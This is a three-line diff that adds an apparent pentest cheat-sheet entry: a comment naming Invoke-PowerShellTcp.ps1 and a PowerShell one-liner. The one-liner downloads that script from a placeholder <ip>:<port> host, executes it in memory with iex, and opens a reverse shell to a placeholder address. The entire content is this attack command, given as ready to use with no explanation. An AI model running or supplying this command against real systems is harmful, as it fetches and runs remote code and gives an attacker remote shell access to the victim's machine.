@@ -1,0 +1,3 @@
+# use Shells/Invoke-PowerShellTcp.ps1
+powershell iex (New-Object System.Net.WebClient).DownloadString('http://<ip>:<port>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <address> -Port <port>
+
